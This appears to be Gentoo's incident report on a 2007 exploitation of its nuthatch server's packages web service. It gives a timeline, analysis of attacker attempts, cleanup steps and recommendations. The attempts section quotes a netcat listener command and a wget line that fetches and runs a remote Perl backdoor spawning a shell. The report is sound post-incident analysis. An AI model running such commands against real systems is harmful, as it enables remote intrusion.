<title>Affected Services</title>
<section>
<body>

<p>
Nuthatch hosted a number of non-critical, informative-only web services. It was
not used for any development or distribution services. A very limited number of
developers had access to the machine, and rarely used it.
</p>

<ul>
    <li>
        packages - Browsable index of packages in the Portage tree.
    </li>
    <li>
        archives - Archives of the Gentoo mailing lists.
    </li>
    <li>
        packagestest, archivestest - Test installations of packages and archives,
        for testing new code and features.
    </li>
    <li>
        scripts - Gentoo Script Repository (GLEP15), defunct.
    </li>
    <li>
        kiss - Kernel Advisory Management tool, defunct.
    </li>
    <li>
        stats - Gentoo Statistics project, defunct.

<title>Timeline overview</title>
<section>
<title>August 1, 2007</title>
<body>

<ol>
    <li>
        The first user to discover/use the exploit was from 65.81.XXX.XXX, at
      01/Aug/2007 15h56 UTC. He ran <c>uname -a</c> and <c>cat /etc/passwd</c>,
      then stops, his IP is not seen again.
  </li>
  <li>
      At 19h36 UTC, the exploit becomes known to a wider group. Either this or
      the initial discovery took place at DEFCON.
  </li>
  <li>
      The next 15 minutes have 18 further usages of the exploit (two of which
      bear further examination), after which the usage drops extremely
      rapidly.
  </li>
  <li>
      There are 7 further attempts on August 1st, the last being at 22h32
      UTC.
  </li>
  <li>
      Including the initial discovery, 9 unique IP addresses have hit the
      exploit on the first day, 27 total attempts. 13 of these attempts are
      <c>cat /etc/passwd</c>. A full breakdown is given at <uri
          link="commands.txt">commands.txt</uri>
  </li>
</ol>

<title>August 6, 2007</title>
<body>

    <ol>
        <li>
            No further attempts to use the exploit are made until 06/Aug/2007 21h10
            UTC. The IP used did also hit the exploit on the first day. It seems like
            it is demonstrated to somebody else, because 6 minutes later, somebody
            uses a near identical URL string (on the seamonkey package) for the
            exploit.
        </li>
        <li>
            (Assumption: the exploit filters through Gentoo at this point. Nobody
            else uses it).
        </li>
        <li>
            The Gentoo bug #187971 is opened for the issue on 07/Aug/2007 02h59
            UTC.
        </li>
        <li>
            At 03h17 one further unknown attempt to use the exploit is made, running
            <c>df</c>. This may have been a Gentoo developer, based on IRC logs of
            #gentoo-dev at the time.
        </li>
        <li>
            At 03h20 UTC, Gentoo infra becomes aware of the exploit, and tests it
            once by running <c>echo EXPLETIVE-DELETED</c>.
        </li>
        <li>
            Apache on the machine is taken offline.
        </li>
        <li>
            Initial data capture of relevant memory contents and volatile machine
            state.
        </li>
        <li>
            Machine is halted.
        </li>
        <li>
            Approximately 04h10 UTC marineam happens to be on-hand at OSL, and reboots the machine
            to a livecd. MANY thanks to marineam for this insanely good response
            time, and here's a plug for the <uri

            kingtaco and robbat2 take an image of the hard drive.
        </li>
        <li>
            The bug now gets left along for the next several days, as the majority of
            the infra team is attending (and later recovering from) LWE.

  <li>Serious analysis on the image begins.</li>

<chapter>
<title>Focus on specific attempts</title>
<section>
<body>

<p>
Two of the attempts bear further commenting.
</p>

<pre caption="Attempt 1">
nc -l -p 9876
</pre>

<p>
This is blocked by the ingress firewall. Default DENY rule wins.
</p>

<pre caption="Attempt 2">
wget -O /var/tmp/foo.pl http://www.regimesyndicate.org/interrupt/foo.pl &amp;&amp; perl /var/tmp/foo.pl yourhost listeningport
</pre>

<p>
This had potential. If the script kiddy that ran this one (obstensibly from
24.227.XXX.XXX) actually had even two brain cells to rub together, he could
have gotten a lot further. Instead, he failed in two ways. Firstly, the
backdoor he was trying to fetch was already gone. It is available elsewhere
via Google, and is a trivial perl listener that spawns /bin/sh. Secondly, he
forgot to specify his outgoing destination host and port. 
</p>

<chapter>
<title>Summary of exploit usage</title>
<section>
<body>

<p>
While Infra is reasonable certain that no attacker successfully executed more
than a few harmless commands, the potential remains for the machine to have
been seriously exploited.
</p>

</body>
</section>
</chapter>

<chapter>
<title>Partially lucking out</title>
<section>
<body>

<p>
Between the time of the first exploit usage, and the exploit becoming known to
Infra, no Gentoo developer logged in with SSH, nor had a long-running shell
open. This means that no user could have had their SSH keys compromised if they
had their SSH agent forwarded to the machine.
</p>

<p>
However, this analysis was needlessly complicated by the fact that Gentoo's
remote logging setup did not seem to be logging all traffic correctly. If it
had been working correctly, a higher degree of certainty, and more information
could have been obtained.
</p>

<chapter>
<title>Cleanup actions</title>
<section>
<body>

<p>
The following has been undertaken to clean up.
</p>

<ol>
    <li>
        The machine has been wiped for a clean install.
    </li>
    <li>
        Almost all services have been restored.
    </li>
    <li>
        The packages code has had the original issue fixed, but remains offline
        pending a full audit.
    </li>
    <li>
        All 20 users with local accounts on the machine should change their
      passwords as a precautionary measure. Any user that had only an LDAP
      account was not affected.
  </li>
</ol>

</body>
</section>
</chapter>

<chapter>
<title>General Recommendations</title>
<section>
<body>

<ul>
    <li>
        Remote logging of external facing services should be verified
        regularly.
    </li>
    <li>
        Consider detailed traffic accounting with a package such as IPaudit (leave
        the GUI out), to aid later analysis.
    </li>
    <li>
        Custom code should be reviewed by the security team before wide usage,
        esp. on critical machines.
    </li>
</ul>
